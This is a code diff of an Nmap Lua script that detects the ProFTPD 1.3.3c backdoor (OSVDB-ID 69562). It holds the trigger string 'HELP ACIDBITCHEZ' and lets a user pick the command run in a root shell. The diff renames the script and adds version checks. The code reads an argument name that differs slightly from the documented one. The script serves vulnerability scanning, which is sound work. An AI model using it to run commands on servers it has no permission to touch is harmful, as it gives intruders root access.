@@ -2,8 +2,8 @@
 -- vim: set filetype=lua :
 
 description = [[
-This script tests ProFTPD 1.3.3c for the presence of the
-backdoor which was reported as OSVDB-ID 69562.
+This script tests ProFTPD 1.3.3c for the presence of the backdoor which was
+reported as OSVDB-ID 69562.
 
 It allows the remote execution of commands in a root shell. The command that is
 executed by default is <code>id</code>, but that can be changed via script-args.
@@ -11,14 +11,15 @@ executed by default is <code>id</code>, but that can be changed via script-args.
 
 ---
 -- @usage
--- nmap --script proftp-backdoor -p 21 <host>
+-- nmap --script ftp-proftpd-backdoor -p 21 <host>
 --
--- @args proftp-backdoor.cmd Command to execute in shell (default is "id").
+-- @args ftp-proftpd-backdoor.cmd Command to execute in shell (default is
+--       <code>id</code>).
 --
 -- @output
 -- PORT   STATE SERVICE
 -- 21/tcp open  ftp
--- | proftp-backdoor:
+-- | ftp-proftpd-backdoor:
 -- |   This installation has been backdoored.
 -- |   Command: id
 -- |   Results: uid=0(root) gid=0(wheel) groups=0(wheel)
@@ -34,16 +35,28 @@ require("stdnse")
 local CMD_FTP = "HELP ACIDBITCHEZ"
 local CMD_SHELL = "id"
 
-portrule = shortport.port_or_service(21, "ftp")
+portrule = function (host, port)
+	-- Check if version detection knows what FTP server this is.
+	if port.version.product ~= nil and port.version.product ~= "ProFTPD" then
+		return false
+	end
+
+	-- Check if version detection knows what version of FTP server this is.
+	if port.version.version ~= nil and port.version.version ~= "1.3.3c" then
+		return false
+	end
+
+	return shortport.port_or_service(21, "ftp")
+end
 
 action = function(host, port)
 	local cmd, err, line, req, resp, results, sock, status
 
-	cmd = stdnse.get_script_args("proftp-backdoor.cmd")
+	-- Get script arguments.
+	cmd = stdnse.get_script_args("ftp-proftp-backdoor.cmd")
 	if not cmd then
 		cmd = CMD_SHELL
 	end
-
 
 	-- Create socket.
 	sock = nmap.new_socket("tcp")
